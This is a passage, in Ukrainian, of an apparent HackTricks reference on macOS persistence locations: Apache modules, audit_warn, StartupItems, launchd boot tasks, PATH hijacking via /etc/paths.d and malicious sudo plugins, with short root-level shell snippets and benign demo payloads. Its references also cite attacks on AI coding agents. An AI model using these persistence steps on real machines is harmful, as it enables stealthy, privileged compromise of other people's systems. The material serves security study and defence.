### Apache2

**Опис**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібні права root, а Apache має бути запущений
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd не має entitlements

#### Розташування

- **`/etc/apache2/httpd.conf`**
  - Потрібні права root
  - Тригер: під час запуску Apache2

#### Опис і експлуатація

У `/etc/apache2/httpd.conf` можна вказати завантаження модуля, додавши рядок на кшталт:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Так ваш скомпільований модуль завантажуватиметься Apache. Єдине, що потрібно, — **підписати його дійсним сертифікатом Apple** або **додати в систему новий довірений сертифікат** і **підписати модуль ним**.

Потім, за потреби, щоб переконатися, що сервер запуститься, можна виконати:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Приклад коду для Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Фреймворк аудиту BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Корисно для обходу sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Але потрібні права root, запущений auditd і умова, що спричинить попередження
- Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Розташування

- **`/etc/security/audit_warn`**
  - Потрібні права root
  - **Умова запуску**: auditd виявляє попередження

#### Опис і експлуатація

Щоразу, коли auditd виявляє попередження, скрипт **`/etc/security/audit_warn`** **виконується**. Тож до нього можна додати свій payload.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Ви можете примусово викликати попередження за допомогою `sudo audit -n`.

### Елементи запуску

> [!CAUTION] > **Це застаріло, тому в цих каталогах нічого не має бути.**

**StartupItem** — це каталог, який має бути розташований у `/Library/StartupItems/` або `/System/Library/StartupItems/`. Після створення цей каталог має містити два конкретні файли:

1. **rc script**: shell-скрипт, який виконується під час запуску.
2. **plist file**, зокрема файл із назвою `StartupParameters.plist`, що містить різні параметри конфігурації.

Переконайтеся, що і rc script, і файл `StartupParameters.plist` правильно розміщені в каталозі **StartupItem**, щоб процес запуску міг їх розпізнати й використати.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Я не можу знайти цей компонент у своїй macOS, тож докладнішу інформацію дивіться у writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Компанія Apple представила **emond** — механізм журналювання, який, схоже, так і не був належно розроблений або, можливо, покинутий, але досі доступний. Хоча він навряд чи буде корисним адміністраторам Mac, цей маловідомий сервіс може стати непомітним методом закріплення для зловмисників, імовірно, залишаючись поза увагою більшості адміністраторів macOS.<sup>[[34]](#references)</sup>

Тим, хто знає про його існування, легко виявити будь-яке зловмисне використання **emond**. LaunchDaemon цієї служби шукає скрипти для виконання в одному каталозі. Щоб перевірити це, можна скористатися такою командою:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Розташування

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Потрібні права root
  - **Умова запуску**: з XQuartz

#### Опис і експлуатація

XQuartz **більше не встановлюється в macOS**, тож, якщо потрібна додаткова інформація, перегляньте writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Встановити kext настільки складно, навіть із правами root, що це не вважається практичним методом обходу sandbox або persistence, якщо у вас немає експлойта.

#### Розташування

Щоб встановити KEXT як елемент автозапуску, його потрібно **встановити в одне з таких розташувань**:

- `/System/Library/Extensions`
  - Файли KEXT, вбудовані в операційну систему OS X.
- `/Library/Extensions`
  - Файли KEXT, встановлені стороннім програмним забезпеченням

Можна переглянути список наразі завантажених файлів kext за допомогою:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Докладніше про [**kernel extensions дивіться в цьому розділі**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Доклад: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Розташування

- **`/usr/local/bin/amstoold`**
  - Потрібні права root

#### Опис і експлуатація

Схоже, що `plist` із `/System/Library/LaunchAgents/com.apple.amstoold.plist` використовував цей бінарний файл, надаючи доступ до XPC service... Річ у тім, що самого бінарного файла не було, тож можна було помістити туди інший файл, і під час виклику XPC service запускався б саме він.<sup>[[35]](#references)</sup>

Тепер я не можу знайти це у своїй macOS.

### ~~xsanctl~~

Доклад: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Розташування

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Потрібні права root
  - **Тригер**: під час запуску служби (рідко)

#### Опис і експлуатація

Схоже, цей скрипт запускають нечасто, і я навіть не зміг знайти його у своїй macOS, тож більше інформації шукайте в докладі.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Це не працює в сучасних версіях MacOS**

Також сюди можна додати **команди, які виконуватимуться під час запуску.** Приклад звичайного скрипту rc.common:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Завдання `launchd` під час завантаження

Опис: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (потрібен root)
- Потрібен root, а також або **обхід SIP**, або дозвіл **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access — залежно від шляху

#### Розташування

`launchd` містить plist у своїй секції **`__TEXT,__config`**, де описані ранні «завдання завантаження». Кілька довідкових скриптів/бінарних файлів, яких типово **не існує** і які може створити зловмисник:

- Набір для обходу SIP: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Набір TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` існує лише в Sequoia+)

#### Опис і експлуатація

Вивантажте вбудовану таблицю завдань, щоб побачити, які файли запускатиме `launchd`, і які ключі підтримуються (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Створення одного з указаних файлів (наприклад, `/etc/rc.server`) змушує `launchd` виконати його під час наступного перезавантаження (простору користувача). Найкорисніші записи обмежені SIP або потребують TCC SysAdminFiles/Full Disk Access, тож це техніка рівня root, що спрацьовує під час перезавантаження.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Завантажувальне завдання `rc.trampoline` запускає **platform binary (підписаний Apple)**, збережений у змінній NVRAM `apple-trusted-trampoline`, під час завантаження, але **лише якщо задано boot-arg `rc.trampoline=1` і SIP вимкнено** (з обмеженням розміру близько 390&nbsp;КБ і вимогою швидкого завершення або блокування). Оскільки для цього потрібні **root + вимкнений SIP + payload, підписаний Apple**, цей спосіб практично непридатний для реального закріплення в системі й наведений тут лише для повноти.<sup>[[41]](#references)</sup>

### /etc/paths і /etc/paths.d (PATH hijack)

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (для запису потрібен root)
- Потрібен root

#### Розташування

- **`/etc/paths`** і **`/etc/paths.d/*`** — читаються програмою **`path_helper`** (яку викликає `/etc/zprofile`) для створення типового `PATH` під час входу в систему.

#### Опис і експлуатація

Обидва файли належать root. Додавання каталогу, контрольованого зловмисником, на початок списку (редагуванням `/etc/paths` або створенням файла в `/etc/paths.d/`) призводить до того, що цей каталог опиняється на початку `PATH` кожної нової оболонки під час входу в систему. У результаті шкідливий бінарний файл із назвою поширеної команди (`ls`, `git`, …) **підміняє** справжній і запускається, коли жертва наступного разу виконає цю команду.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### SIP-bypass через storagekitd (CVE-2024-44243)

Опис: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (потрібні права root)
- Потрібні права root; результат — **обхід SIP**. Уразливі версії macOS **15.0–15.1**, виправлено у **15.2**

#### Розташування

- Розмістіть файловий bundle у **`/Library/Filesystems/`**.

#### Опис і експлуатація

`storagekitd` має entitlement **`com.apple.rootless.install.heritable`** і запускав бінарні файли файлових bundle з успадкованою можливістю обходити SIP. Розмістивши шкідливий файловий bundle, зловмисник міг виконувати код з обходом SIP, щоб інсталювати **постійні kernel extensions** або записувати дані в захищені SIP каталоги `LaunchDaemon` — така персистентність зберігається й обходить звичайні засоби захисту.<sup>[[46]](#references)</sup> Apple виправила цю проблему в macOS Sequoia 15.2.

### Плагіни sudo (/etc/sudo.conf)

Опис: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Корисно для обходу sandbox: [🔴](https://emojipedia.org/large-red-circle) (потрібні права root для запису в `/etc/sudo.conf`)
- Для встановлення потрібні права root; після цього плагін запускається під час **кожного виклику `sudo`** (у контексті setuid-root)

#### Розташування

- **`/etc/sudo.conf`** — рядки `Plugin` завантажують shared objects із **`/usr/libexec/sudo/`** (або за абсолютним шляхом). За замовчуванням цього файла немає (sudo використовує вбудовану політику), тож його створення є простим способом встановити hook.

#### Опис і експлуатація

`sudo` завантажує плагіни політики, схвалення й аудиту з `/etc/sudo.conf`. Оскільки `sudo` має setuid-root, шкідливий плагін shared object виконується з **правами root щоразу, коли будь-який користувач запускає `sudo`** — це забезпечує тривалу персистентність root і дає змогу бачити кожну команду sudo.<sup>[[51]](#references)</sup> У macOS постачається sudo 1.9.x, що підтримує API плагінів.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### Плагіни CoreMediaIO DAL

Опис: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Мінімальний приклад: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Застарілий механізм:** застарів, починаючи з macOS 12.3. У macOS 14.1 і новіших застарілі відеоплагіни за замовчуванням вимкнені. Щоб цей шлях працював, користувач має відновити підтримку застарілих відеоплагінів через Recovery; самого доступу до каталогу на запис недостатньо. [Поточні рекомендації Apple](https://support.apple.com/en-us/108387).
- Для запису в каталог плагінів потрібні права root. Виконання коду залежить від сумісного клієнта, який досі завантажує DAL-плагіни; роботу цього механізму під час виконання в macOS 26 не перевіряли.

#### Розташування

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Потрібні права root
  - **Тригер:** сумісний клієнт камери перелічує пристрої **після відновлення підтримки застарілих плагінів**. Перевірка бібліотек клієнтом може блокувати сторонній плагін.

#### Опис і експлуатація

Плагіни CoreMediaIO **DAL** (Device Abstraction Layer) завантажувалися в процес деякими програмами для роботи з камерою. У [презентації Apple про розширення камери](https://developer.apple.com/videos/play/wwdc2022/10022/) прямо зазначено, що застарілі DAL-плагіни **не** працювали з FaceTime, QuickTime Player або Photo Booth, а багато інших клієнтів застосовують перевірку бібліотек. Сучасні [розширення Core Media I/O](https://developer.apple.com/documentation/coremediaio) працюють поза процесом і мають окрему модель інсталяції та затвердження. Історичний механізм виконання коду в процесі не означає наявності загального обходу Camera TCC у поточній macOS.<sup>[[53]](#references)[[54]](#references)</sup>

Спостереження лише для читання в macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` існує та належить root. Наявність підтримки застарілих плагінів і завантаження будь-яким клієнтом не перевіряли.

### Плагіни Directory Service

Опис: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Застарілий умовний механізм:** для інсталяції потрібні права root, а плагін має бути фактично налаштований і завантажений. API плагінів DirectoryService застарів; перш ніж вважати це тригером під час завантаження, перевірте конфігурацію Open Directory цільового Mac.

#### Розташування

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Потрібні права root
  - **Тригер:** `dspluginhelperd` завантажує відповідний налаштований плагін, коли він потрібен Open Directory. У [посібнику Apple з роботи середовища виконання плагінів](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) зазначено, що плагіни, не налаштовані для запуску під час старту, можуть завантажуватися за потреби під час відкриття вузла.

#### Опис і експлуатація

`dspluginhelperd` підтримує застарілі пакети плагінів DirectoryService. Шкідливий плагін може створити шлях привілейованого виконання коду, якщо застарілий плагін дозволено й активовано; це окремий механізм від PAM і Authorization Plugins. Сам факт існування каталогу не доводить, що новий плагін буде запущено під час наступного завантаження. Локальні посібники Apple `dspluginhelperd(8)` і `opendirectoryd(8)` у macOS 26.5 досі описують цей допоміжний процес і застарілий механізм.<sup>[[53]](#references)</sup>

Спостереження лише для читання в macOS 26: `/Library/DirectoryServices/PlugIns` і `/usr/libexec/dspluginhelperd` існують. Під час цього тесту плагін не інсталювали, не налаштовували й не завантажували.

## Техніки та інструменти persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025 — рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [За межами звичних LaunchAgents — 1 — файли запуску shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [За межами звичних LaunchAgents — 18 — X11 і XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [За межами звичних LaunchAgents — 21 — повторно відкриті програми](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [За межами звичних LaunchAgents — 20 — налаштування Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [За межами звичних LaunchAgents — 13 — аудіоплагіни](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Плагіни Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [За межами звичних LaunchAgents — 12 — плагіни QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [За межами звичних LaunchAgents — 22 — LoginHook і LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [За межами звичних LaunchAgents — 4 — завдання cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [За межами звичних LaunchAgents — 2 — запуск iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [За межами звичних LaunchAgents — 7 — плагіни xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [За межами звичних LaunchAgents — 8 — Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [За межами звичних LaunchAgents — 6 — SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [За межами звичних LaunchAgents — 3 — елементи входу](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [За межами звичних LaunchAgents — 14 — atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [За межами звичних LaunchAgents — 24 — дії з папками](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Дії з папками для persistence у macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [За межами звичних LaunchAgents — 27 — ярлики Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [За межами звичних LaunchAgents — 17 — палітри кольорів](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [За межами звичних LaunchAgents — 26 — плагіни Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Аналіз persistence через «Mac File Opener» (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [За межами звичних LaunchAgents — 16 — заставка](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Збереження доступу: заставки для persistence у macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [За межами звичних LaunchAgents — 11 — імпортери Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [За межами звичних LaunchAgents — 9 — панель налаштувань](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [За межами звичних LaunchAgents — 19 — періодичні скрипти](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [За межами звичних LaunchAgents — 5 — модулі автентифікації, що підключаються (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [За межами звичних LaunchAgents — 28 — плагіни авторизації](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Тривале викрадення облікових даних за допомогою плагінів авторизації (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [За межами звичних LaunchAgents — 30 — файл конфігурації man — man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [За межами звичних LaunchAgents — 25 — модулі Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [За межами звичних LaunchAgents — 31 — фреймворк аудиту BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [За межами звичних LaunchAgents — 23 — emond, демон моніторингу подій](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [За межами звичних LaunchAgents — 29 — amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [За межами звичних LaunchAgents — 15 — xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [За межами звичних LaunchAgents — 10 — файли скриптів програм](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [За межами звичних LaunchAgents — 32 — плагіни Dock Tile](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [За межами звичних LaunchAgents — 33 — віджети](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [За межами звичних LaunchAgents — 34 — завдання завантаження launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [За межами звичних LaunchAgents — 35 — persistence через NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Використання електронної пошти для persistence в OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Підозріла модифікація plist правил Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Шкідливі профілі — одна з найсерйозніших загроз для Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Мистецтво шкідливого ПЗ для Mac, т. 1 — розд. 0x2: Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Аналіз CVE-2024-44243 — обхід SIP у macOS через розширення ядра (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE і викрадення API-токенів через файли проєктів Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Нова вразливість у GitHub Copilot і Cursor — бекдор у файлі правил (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome — альтернативні способи інсталяції (зовнішні розширення)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Видалення ExtensionInstallForcelist у Chrome на Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Про написання плагінів sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Віддалена експлуатація Mac через власні URL-схеми (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Два трюки persistence у macOS із використанням плагінів (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Мінімальний приклад CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: аналіз уразливості macOS TCC на основі Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Документація модуля Python `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
